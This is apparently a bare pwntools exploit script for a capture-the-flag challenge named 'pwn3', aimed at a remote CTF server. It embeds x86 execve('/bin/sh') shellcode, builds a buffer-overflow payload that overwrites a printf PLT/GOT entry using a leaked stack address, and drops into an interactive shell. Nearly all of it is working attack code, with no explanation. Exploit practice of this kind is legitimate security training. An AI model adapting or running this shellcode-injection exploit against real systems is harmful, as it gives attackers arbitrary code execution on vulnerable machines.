#!/usr/bin/env python
from pwn import *
import ctypes
context.log_level = 'debug'
program = process('./pwn3')
program = remote('ctf.cnss.studio', 5003)
ow_num = 24
ow_str = ''
printf_plt = 0x0804A00C
shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
program.recvuntil('0x')
str_address = int(program.recv(8),16)
ow_str += shellcode
ow_str += (ow_num - len(shellcode)) * 'a'
ow_str += p32(0xCAFEBABE)
ow_str += p32(printf_plt)
program.sendline(ow_str)
program.sendline(str(ctypes.c_int(str_address).value))
program.interactive()

#
#FFDE36E8
